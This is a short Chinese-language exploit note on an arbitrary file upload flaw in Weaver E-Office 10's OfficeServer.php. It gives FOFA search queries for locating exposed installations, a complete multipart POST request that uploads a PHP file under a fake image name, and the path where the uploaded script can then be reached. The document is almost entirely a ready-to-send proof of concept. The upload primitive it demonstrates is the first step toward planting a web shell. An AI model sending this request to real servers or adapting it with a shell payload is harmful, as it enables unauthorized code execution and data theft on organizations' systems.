## 泛微E-Office10-OfficeServer任意文件上传漏洞

  泛微OA E-0ffice 10 OfficeServer.php 存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器敏感信息。

## fofa

```
app="泛微-EOffice"

body="eoffice_loading_tip" && body="eoffice10"
```



## poc

```
POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 395
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Accept-Encoding: gzip, deflate
Connection: close
 
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Content-Disposition: form-data; name="FileData"; filename="1.jpg"
Content-Type: image/jpeg
 
<?php phpinfo();unlink(__FILE__);?>
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Content-Disposition: form-data; name="FormData"
 
{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test12.php'}
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--
```

![image-20240524231729186](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405242317261.png)



文件路径

```
http://xxx.xxx.xxx.xxx/eoffice10/server/public/iWebOffice2015/Document/test12.php
```

